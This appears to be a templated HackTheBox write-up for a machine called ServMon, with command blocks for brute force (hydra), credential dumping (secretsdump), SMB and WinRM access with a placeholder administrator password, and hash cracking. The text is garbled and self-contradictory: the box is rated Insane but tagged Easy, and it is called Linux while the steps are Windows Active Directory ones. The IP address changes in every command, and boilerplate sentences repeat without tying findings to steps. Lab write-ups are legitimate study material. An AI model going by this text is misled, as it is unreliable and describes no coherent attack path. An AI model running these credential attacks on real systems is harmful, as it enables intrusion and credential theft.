---
TitleSEO: "HackTheBox — ServMon (Insane Linux) | ZureFX"
TitlePost: "HackTheBox — ServMon (Insane Linux)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox ServMon. Cron Job and Kerberoasting to achieve insane compromise on Linux."
Keywords: "insane, offsec, active directory, easy"
URL: "https://zurefx.github.io/writeups/htb-servmon-383.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-servmon-383/"
Date: "2025-04-02"
Tags: "Insane, OffSec, Active Directory, Easy"
Section: "writeups"
Lang: "en"
main_img: "htb-servmon-383"
Permalink: "/writeups/htb-servmon-383.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **ServMon** is rated **Insane** on HackTheBox. It runs **Linux** and the IP address during this analysis was `10.66.251.165`.

### Objectives

Initial enumeration revealed several interesting open ports on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.94.148.129 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p1521,995,5985 10.37.179.179 -oN scan.txt
```

Network traffic analysis revealed unencrypted communications containing user credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Service Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. The kernel version was outdated and vulnerable to a publicly known exploit. Initial enumeration revealed several interesting open ports on the target.

```bash
crackmapexec smb 10.23.106.161 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.47.186.170
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.32.45.153/FUZZ
```

Unconstrained delegation was enabled on the compromised machine. Post-exploitation enumeration revealed a path to domain administrator privileges.

### SMB Enumeration

The application stored sensitive credentials in an unencrypted configuration file. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.77.178.218/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.99.72.205 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Network traffic analysis revealed unencrypted communications containing user credentials. The service was running without proper input validation, leading to injection vulnerabilities. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Exploitation

### Vulnerability Identification

Network traffic analysis revealed unencrypted communications containing user credentials. The database credentials were hardcoded in the application source code. The web application was vulnerable to Server-Side Template Injection (SSTI).

Key finding: **Writable PATH**.

Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions.

### Initial Access

The service was running without proper input validation, leading to injection vulnerabilities. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
nmap -sCV -p636,8888,23 10.73.133.222 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.123.104.198/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.59.43.35/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Privilege escalation was possible due to misconfigured sudo permissions. Group Policy Preferences contained encrypted but recoverable credentials.

## Privilege Escalation

### Enumeration

Unconstrained delegation was enabled on the compromised machine. The web application was vulnerable to Server-Side Template Injection (SSTI). The target system was identified as running a vulnerable version of the service.

```bash
crackmapexec smb 10.127.42.54 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.85.4.1/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.62.156.22/FUZZ
```

### Exploitation

Group Policy Preferences contained encrypted but recoverable credentials. The application stored sensitive credentials in an unencrypted configuration file.

```bash
evil-winrm -i 10.104.142.166 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.62.190.11/FUZZ
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The scheduled task ran with elevated privileges and could be abused for escalation. Unconstrained delegation was enabled on the compromised machine.

## Summary

### Tools Used

- `metasploit`
- `gobuster`
- `smbexec`
- `wmiexec`
- `GetUserSPNs`
- `hashcat`

### Key Takeaways

- Cron Job
- Kerberoasting
- Writable PATH
- LAPS Abuse
